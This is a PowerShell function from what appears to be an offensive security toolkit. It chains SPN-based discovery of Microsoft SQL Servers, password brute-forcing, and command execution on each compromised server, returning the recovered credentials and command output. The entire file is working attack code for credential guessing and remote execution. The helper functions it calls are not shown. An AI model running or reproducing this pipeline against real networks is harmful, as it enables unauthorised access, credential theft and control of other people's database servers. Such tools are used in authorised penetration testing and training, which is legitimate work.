Function Invoke-MSSQLSPNSearchBruteAndExec {

    <#
.SYNOPSIS
    Search for Microsoft SQL Servers by SPN (Service Principal Name), 
    try to guess passwords and exec command
.DESCRIPTION
    It utilizes Invoke-MSSQLSPNSearch, Invoke-MSSQLBrute and Invoke-MSSQLExec functions
.PARAMETER Command
    Command to execute
.INPUTS
    None
.OUTPUTS
    Array of objects with proporties: Host, User, Password, Command, Output
.NOTES
    Author: Pawel Maziarz <pawel.maziarz@immunity-systems.com>
.EXAMPLE
    Invoke-MSSQLSPNSearchBruteAndExec 
.EXAMPLE
    Invoke-MSSQLSPNSearchBruteAndExec -Command "net user" -Verbose
.LINK
https://blog.aptmasterclass.com/
#>

    [CmdletBinding()]
    Param(
        [Parameter()]
        [String]$Command = ("whoami")
    )

    Begin {
    }

    Process {
        Invoke-MSSQLSPNSearch | Invoke-MSSQLBrute | Invoke-MSSQLExec -Command $Command
    }

    End {
    }

}